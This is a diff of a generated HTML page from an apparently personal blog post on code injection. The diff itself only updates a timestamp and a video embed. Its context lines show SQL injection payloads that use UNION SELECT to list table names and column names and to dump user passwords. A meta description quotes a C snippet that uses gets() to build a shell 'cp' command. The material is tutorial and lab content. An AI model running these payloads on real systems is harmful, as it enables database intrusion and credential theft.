@@ -110,7 +110,7 @@
 <meta property="og:image" content="http://fenlan.github.io/images/sql5.png">
 <meta property="og:image" content="http://fenlan.github.io/images/sql6.png">
 <meta property="og:image" content="http://fenlan.github.io/images/sql7.png">
-<meta property="og:updated_time" content="2017-12-22T01:03:43.276Z">
+<meta property="og:updated_time" content="2017-12-22T01:14:03.949Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码注入">
 <meta name="twitter:description" content="c程序代码注入c程序:123456789101112131415#include &amp;lt;stdio.h&amp;gt;int main(int argc, char *argv[])&amp;#123;	char src[100], dst[100], cmd[205] = &quot;cp &quot;;	printf(&quot;Please enter name of source file:&quot;);	gets(src);	strcat">
@@ -445,8 +445,7 @@
 <h3 id="获取当前表名"><a href="#获取当前表名" class="headerlink" title="获取当前表名"></a>获取当前表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
 <h3 id="获取当前表字段名"><a href="#获取当前表字段名" class="headerlink" title="获取当前表字段名"></a>获取当前表字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">' #</span></span><br></pre></td></tr></table></figure>
 <h3 id="获取所有数据"><a href="#获取所有数据" class="headerlink" title="获取所有数据"></a>获取所有数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>
-<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><video src="https://youtu.be/UwJr-RsEy58" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"><br>your browser does not support the video tag<br></video>
-
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><div class="video-container"><iframe src="//www.youtube.com/embed/https://youtu.be/UwJr-RsEy58" frameborder="0" allowfullscreen></iframe></div>
 <h2 id="引用地址"><a href="#引用地址" class="headerlink" title="引用地址"></a>引用地址</h2><ul>
 <li><a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/120747.html</a></li>
 </ul>
